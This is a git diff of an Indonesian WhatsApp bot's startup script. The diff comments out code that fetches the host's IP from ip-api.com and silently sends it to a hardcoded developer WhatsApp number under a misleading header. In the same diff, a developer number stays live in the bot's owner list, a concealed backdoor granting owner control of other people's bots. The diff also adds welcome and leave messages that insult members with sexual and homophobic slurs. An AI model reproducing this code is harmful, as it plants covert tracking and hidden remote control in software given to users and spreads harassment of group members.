@@ -23,32 +23,40 @@ async function starts() {
 pemuda.autoReconnect = ReconnectMode.onConnectionLost
     pemuda.version = [ 2, 2143, 3 ]
     pemuda.logger.level = 'warn'
-    pemuda.browserDescription = ['Xprast Hunter','Desktop','3.0']
+    pemuda.browserDescription = ['Pemuda Teknologi','Desktop','3.0']
     await sleep(7000)
     pemuda.on('qr', qr => {
         qrcode.generate(qr, { small: true })
-        console.log(color('|TRM|'), color('Scan Kodenya Tod', 'red'))
+        console.log(color('|TRM|'), color('Scan Kodenya bang', 'red'))
     })
     fs.existsSync('./QRnya.json') && pemuda.loadAuthInfo('./QRnya.json')
     
+    pemuda.on('connecting', () => {
+        start('1', 'Connecting...')
+    })
+    pemuda.on('open', () => {
+        success('1', 'Connected')
+    })
+    
     pemuda.on('credentials-updated', () => {
-        console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
+        console.log("\x1b[1;36m[EXEC] Update Script")
         })
+        
      
       await pemuda.connect({ timeoutMs: 30 * 1000 });
   fs.writeFileSync("./QRnya.json",JSON.stringify(pemuda.base64EncodedAuthInfo(), null, "\t"));
- teks = `https://chat.whatsapp.com/Ifk2ChQiGoTEHq0go90V7N`
+ /*teks = `https://chat.whatsapp.com/Ifk2ChQiGoTEHq0go90V7N`
  pemuda.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official Pemuda Teknologi', 'cyan'))
  pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6282252509320?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       pemuda.sendMessage("6281319182408@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Xprast Hunter",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6281319182408?text=Assalamualaikum"}}})
+       pemuda.sendMessage("6282252509320@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6282252509320?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
-   })
+   })*/
       
-    pemuda.on('connecting', () => {
+    /*pemuda.on('connecting', () => {
 		console.log(color('|TRM|'), color('Connecting, Pastikan Jaringan Bagus...', 'cyan'))
 		})
 	
@@ -66,12 +74,12 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
     
 	if (!settings.autoplaymusic) {
 exec(`cd /sdcard/download && play *mp3`)
-}
-   
+}*/
+
    pemuda.on('chat-update', async (mek) => {
         require('./pemuda.js')(pemuda, mek)
-        ownerNumber = ["6281319182408@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "6281319182408@s.whatsapp.net"
+        ownerNumber = ["6282252509320@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "6282252509320@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
         pemuda.on('group-participants-update', async (anu) => {
@@ -80,7 +88,7 @@ exec(`cd /sdcard/download && play *mp3`)
 		    try {
 			console.log(anu)
 			if (anu.action == 'add') {
-			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6281319182408-1632837946@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6281319182408:6281319182408\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6282252509320:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 		    num = anu.participants[0]
 		    //Button ocument
 const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = 
@@ -98,31 +106,31 @@ headerType: "DOCUMENT"
 pemuda.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 }
 			try {
-			ppimg = await pemuda.getProfilePicture(`${num.split('@')[0]}@c.us`)
+			ppimg = fs.readFileSync(`./ppimg.jpg`)
 			} catch {
-			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+			ppimg = fs.readFileSync(`./ppimg.jpg`)
 			}
-			let buff = await getBuffer(ppimg)
-						masuk =`SELAMAT DATATANG TOD..\nHalo @${num.split('@')[0]}`
-		bumess = [{buttonId: `!000`, buttonText: {displayText: `Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n*TERIMA KASIH*`}, type: 1}]
+			let buff = ppimg
+						masuk =`Eh ads Member baru nih..\nHalo @${num.split('@')[0]}`
+		bumess = [{buttonId: `!000`, buttonText: {displayText: `Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n*AKU MAU KASIH TAU KALAU AKU ITU ANAK HASIL ZINA*`}, type: 1}]
 			const masukan = {
     contentText: `${masuk}`,
-    footerText: `Jangan Jadi Beban Ya di › ${mdata.subject}\nKlik Oke Untuk Melanjutkan`,
+    footerText: `Selamat Datang di › ${mdata.subject}\nKlik Oke Untuk Melanjutkan`,
     buttons: bumess,
     headerType: 1
 }
-			pemuda.sendMessage(mdata.id, masukan, MessageType.buttonsMessage, fs.readFileSync('./media/sampah/pemuda'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/script.jpg'), filename:`Tes cok`}, {quoted:m.message, contextInfo: {"mentionedJid": [m.participant]}, forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Download Script`,mediaType:"2",thumbnail:buff,mediaUrl:`https://youtube.com/channel/UCWvEpbAFpEGZPy7dsSMsm0g`}})
+			pemuda.sendMessage(mdata.id, masukan, MessageType.buttonsMessage, fs.readFileSync('./media/sampah/pemuda'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/script.jpg'), filename:`Tes cok`}, {quoted:m.message, contextInfo: {"mentionedJid": [m.participant]}, forwardingScore: 508, isForwarded: true, externalAdReply:{title:`Download Script`,mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/x-O0WHkv3uc`}})
 			} else if (anu.action == 'remove') {
-			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6281319182408-1632837946@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6281319182408:6281319182408\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6282252509320:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 			num = anu.participants[0]
 			try {
-			ppimg = await pemuda.getProfilePicture(`${num.split('@')[0]}@c.us`)
+			ppimg = fs.readFileSync(`./ppimg.jpg`)
 			} catch {
-			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+			ppimg = fs.readFileSync(`./ppimg.jpg`)
 			}
-			let buff = await getBuffer(ppimg)
-			keluarkan =`Kalau keluar pamit dlu ajg\nSi beban @${num.split('@')[0]}\nGo to the hell :v`
-		bumesss = [{buttonId: `!000`, buttonText: {displayText: 'Goodbye‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nJangan balik lagi ya...!!'}, type: 1}]
+			let buff = ppimg
+			keluarkan =`Yahh, ada yang keluar 😭\nSelamat tinggal @${num.split('@')[0]}\nSemoga gak jadi beban lagi disini :v`
+		bumesss = [{buttonId: `!000`, buttonText: {displayText: 'Goodbye‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nDia Pacarku guys, Kita Ngegay udah lama, gak tau kenapa tiba2 Keluar grup 😭'}, type: 1}]
 			const Keluarlah = {
     contentText: `${keluarkan}`,
     footerText: `Beban Grup › ${mdata.subject}`,
@@ -179,16 +187,16 @@ console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.
   }
 })
 
-pemuda.on('CB:action,,call', async json => {
+/*pemuda.on('CB:action,,call', async json => {
         const callerId = json[2][0][1].from;
         var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
         pemuda.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
         pemuda.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:`https://wa.me/6282252509320?text=Assalamualaikum`}}})
         await sleep(5000)
         await pemuda.blockUser(callerId, "add")
-        })
+        })*/
         
-	pemuda.on('message-delete', async (m) => {
+	/*pemuda.on('message-delete', async (m) => {
 if (m.key.remoteJid == 'status@broadcast') return
 if (!m.key.fromMe && antidelete)
 m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
@@ -202,27 +210,23 @@ let locale = 'id'
 let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
 let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
 let week = d.toLocaleDateString(locale, { weekday: 'long' })
-let calender = d.toLocaleDateString(locale, {
-day: 'numeric',
-month: 'long',
-year: 'numeric'
-})
+let calender = d.toLocaleDateString(locale, {day: 'numeric', month: 'long', year: 'numeric'})
 pemudadelete = `*「 PESAN DITARIK TERDETEKSI 」*
 › Dari : *@${m.participant.split("@")[0]}*
 › Waktu : ${jam}
 › Tanggal : ${calender}`
-button = [{buttonId: `!000`, buttonText: {displayText: 'Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nʟᴀɪɴ ᴋᴀʟɪ ᴊᴀɴɢᴀɴ ᴜɴsᴇɴᴇ ᴄʜᴀᴛ..﹗﹗'}, type: 1}]
+button = [{buttonId: `!000`, buttonText: {displayText: 'Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nYahh gpp Sumpah , fiturnya sangat membantu para pelaku Penjahat Kelamin :)'}, type: 1}]
 const buMess = {
     contentText: `${pemudadelete}`,
-    footerText: 'ᴀɴᴛɪ ᴅᴇʟᴇᴛᴇ › ᴛᴇʀᴄʏᴅᴜᴋ ᴩᴇsᴀɴ ɪɴɪ ᴛᴇʟᴀʜ ᴅɪʜᴀᴩᴜs',
+    footerText: 'Anti Delete › Pesan ini telah di hapus',
     buttons: button,
     headerType: 1
 }
 pemuda.sendMessage(m.key.remoteJid, buMess, MessageType.buttonsMessage, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
 pemuda.copyNForward(m.key.remoteJid, m.message)
-})
+})*/
 }
-console.clear()
+/*console.clear()
 var progressBar , progress = 0 ;
 function doProgress()
 {
@@ -232,29 +236,28 @@ function doProgress()
 	if ( progress >= 1 )
 	{
 		setTimeout( function() { console.clear(),
-		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
-			console.log(stdout), console.log(bgcolor('BOT SUDAH AKTIF', 'red'))})}, 200 ) ;
+		exec(`neofetch --ascii_distro Parrot`, (error, stdout, stderr) => {
+			console.log(stdout), console.log(bgcolor('Subcribe : Random Video', 'red'))})}, 200 ) ;
 	}
 	else
 	{
-		setTimeout( doProgress , 70 + Math.random() * 100 ) ;
+		setTimeout( doProgress , 90 + Math.random() * 100 ) ;
 	}
 }
-console.log(color(figlet.textSync(`${settings.NamaBot}`, {
+console.log(color(figlet.textSync(`Bitch Bot`, {
 		font: 'Standard',
 		horizontalLayout: 'default',
 		vertivalLayout: 'default',
 		width: 50,
 		whitespaceBreak: true
-	    }), 'lightgreen')), term.slowTyping('By Denis Putra - Recode by Xprast17' ,{ flashStyle: term.brightWhite })
+	    }), 'lightgreen')), term.slowTyping('By Denis Putra - Recode by RandomVideo' ,{ flashStyle: term.brightWhite })
 progressBar = term.progressBar( {
 	width: 80 ,
-	title: '\n\nSabar Anjing' ,
+	title: '\n\nLoading' ,
 	eta: true ,
 	percent: true
 } ) ;
-doProgress() ;
-
+doProgress() ;*/
 /**
  * Uncache if there is file change
  * @param {string} module Module name or path
